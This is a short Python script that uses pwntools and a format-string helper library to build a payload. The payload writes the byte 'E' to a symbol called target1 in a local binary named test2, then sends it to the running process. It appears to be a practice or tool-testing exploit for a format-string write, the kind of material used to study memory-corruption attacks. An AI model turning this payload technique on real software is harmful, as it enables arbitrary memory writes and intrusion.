from one_fmt import *
from pwn import *

elf = ELF("./test2", checksec=False)

fmt = Fmt(6)
fmt[elf.symbols["target1"]] = "E"
# fmt[elf.symbols["target2"]] = "THERE"
payload = fmt.build(0)

r = process("./test2", level="debug")
r.send(payload)
r.interactive()
